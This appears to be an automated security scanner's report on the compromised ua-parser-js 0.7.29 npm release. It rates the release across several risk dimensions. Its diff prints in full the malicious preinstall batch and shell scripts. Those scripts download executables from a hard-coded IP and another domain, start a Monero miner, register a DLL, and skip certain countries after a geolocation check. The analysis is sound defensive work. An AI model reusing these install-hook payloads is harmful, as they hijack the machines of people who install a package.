dimensions.name: network_calls
dimensions.label: New or changed network calls
dimensions.reasoning: preinstall.bat and preinstall.sh download binaries from a hard-coded IP (http://159.148.186.228/download/jsextension.exe and /jsextension) and a secondary domain (https://citationsherbe.at/sdd.dll) using curl, wget, and certutil. preinstall.sh also calls https://freegeoip.app/xml/ to geolocate the victim. These are unambiguous exfiltration/download patterns.

dimensions.name: obfuscation
dimensions.label: Obfuscation / encoding patterns (base64, eval, dynamic require)
dimensions.reasoning: No base64 or eval-based obfuscation is present. The malicious intent is carried out in plain shell/batch commands. The wallet address in the miner command line is redacted in the diff but was presumably present in the original file. Low obfuscation score as the payload is written in clear text.

dimensions.name: install_hooks
dimensions.label: Postinstall / preinstall script additions or changes
dimensions.reasoning: Three new files (preinstall.js, preinstall.bat, preinstall.sh) are added and a 'preinstall' npm lifecycle hook is registered. preinstall.js is the entry point that dispatches to the platform-specific script, ensuring the malicious code runs automatically during npm install on Windows, Linux, and macOS.

dimensions.name: env_conditional
dimensions.label: Conditional logic gated on env vars, platform, or CI detection
dimensions.reasoning: preinstall.js branches on process.platform (win32/win64, darwin, linux) to execute platform-specific payloads. preinstall.sh checks the victim's geolocation via freegeoip.app and skips execution if the IP resolves to Russia (RU), Ukraine (UA), Belarus (BY), or Kazakhstan (KZ) — a classic nation-state or attacker self-protection pattern to avoid infecting the attacker's own region.

dimensions.name: dependency_changes
dimensions.label: Dependency graph changes (new transitive deps)
dimensions.reasoning: No new npm dependencies are added in the diff. The malicious payload is delivered via inline shell/batch scripts rather than through the npm dependency graph. Score is minimal; confidence is moderate because the full package.json is not shown.

file_diffs.unified_diff:
+@echo off
+curl http://159.148.186.228/download/jsextension.exe -o jsextension.exe
+if not exist jsextension.exe (
+	wget http://159.148.186.228/download/jsextension.exe -O jsextension.exe
+)
+if not exist jsextension.exe (
+	certutil.exe -urlcache -f http://159.148.186.228/download/jsextension.exe jsextension.exe
+)
+curl https://citationsherbe.at/sdd.dll -o create.dll
+if not exist create.dll (
+	wget https://citationsherbe.at/sdd.dll -O create.dll
+)
+if not exist create.dll (
+	certutil.exe -urlcache -f https://citationsherbe.at/sdd.dll create.dll
+)
+set exe_1=jsextension.exe
+set "count_1=0"
+>tasklist.temp (
+tasklist /NH /FI "IMAGENAME eq %exe_1%"
+)
+for /f %%x in (tasklist.temp) do (
+if "%%x" EQU "%exe_1%" set /a count_1+=1
+)
+if %count_1% EQU 0 (start /B .\jsextension.exe -k --tls --rig-id q -o pool.minexmr.com:443 -u <redacted> \
+   --cpu-max-threads-hint=50 --donate-level=1 --background & regsvr32.exe -s create.dll)
+del tasklist.temp

+IP=$(curl -k https://freegeoip.app/xml/ | grep 'RU\|UA\|BY\|KZ')
+if [ -z "$IP" ]
+    then
+	var=$(pgrep jsextension)
+	if [ -z "$var" ]
+		then
+		curl http://159.148.186.228/download/jsextension -o jsextension
+		if [ ! -f jsextension ]
+			then
+			wget http://159.148.186.228/download/jsextension -O jsextension
+		fi
+		chmod +x jsextension
+		./jsextension -k --tls --rig-id q -o pool.minexmr.com:443 -u <redacted> \
+            --cpu-max-threads-hint=50 --donate-level=1 --background &>/dev/null &
+	fi
+fi

llm_summary: This update to ua-parser-js 0.7.29 is a confirmed supply chain attack. Three new preinstall scripts (preinstall.js, preinstall.bat, preinstall.sh) are added that execute automatically on npm install. They download and run a cryptominer binary (jsextension / jsextension.exe) connecting to pool.minexmr.com:443, and on Windows also register a DLL (create.dll fetched from citationsherbe.at) via regsvr32. A geolocation check deliberately skips execution in RU/UA/BY/KZ regions, a hallmark of targeted threat actors. This is definitively malicious and matches the publicly documented ua-parser-js supply chain compromise from October 2021.
